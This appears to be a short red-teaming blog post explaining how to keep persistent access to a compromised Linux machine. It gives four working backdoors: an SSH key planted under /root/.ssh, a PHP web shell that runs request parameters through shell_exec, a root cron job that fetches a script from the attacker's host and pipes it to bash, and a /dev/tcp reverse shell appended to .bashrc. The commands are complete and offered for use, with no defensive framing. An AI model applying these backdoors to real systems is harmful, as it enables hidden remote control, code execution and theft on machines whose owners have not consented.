---
title: "Backdoors"
collection: posts
type: "Info"
permalink: /posts/backdoors
venue: "Red Teaming"
date: 2023-03-23
location: "City, Country"
---

## Description : 

A backdoor attack is a way to ensure our consistent access to the machine

---

### SSH Backdoor : 

* Generate a set of ssh keys : 

```bash
ssh-keygen
```

* Now we have 2 keys, 1 private key and 1 public key 
* We rename the ublic key to *authorized_key* and move it to /root/.ssh

* Now we transfer the private key to our machine and give it the right permission 

```bash
chmod 600 id_rsa
```

* To login into our target machine :

```bash
ssh -i id_rsa root@X.X.X.X
```

---

### PHP Backdoor : 

* Create a php file 
* put this piece of code inside the php file :

```bash
<?php
if (isset($_REQUEST['cmd'])) {
echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}

?>
```
* You have to leave the file in /var/www/html or you can add this piece of code in already existing php files

* You can access the file by visiting http:/X.X.X.X./FILE.php

---

### Cronjob Backdoor : 

* On your machine create a shell file: 
```bash 
#!/bin/bash
bash -i >& /dev/tcp/<YOUR-IP>/<YOUR-PORT> 0>&1
```

* Start a python web server 

```bash
python3 -m http.server
```

* Add this line in /etc/crontab

```bash
* *     * * *   root    curl http://<yourip>:80/shell | bash
```

---

### .bashrc Backdoor : 

* Run this command :

```bash
echo 'bash -i >& /dev/tcp/<YOUR-IP>/<YOUR-PORT> 0>&1' >> ~/.bashrc
```

* If a user has bash as their login shell, the ".bashrc" file in their home directory is executed when an interactive session is launched

* You should always have your *nc* listener ready as we don't know when the user will log on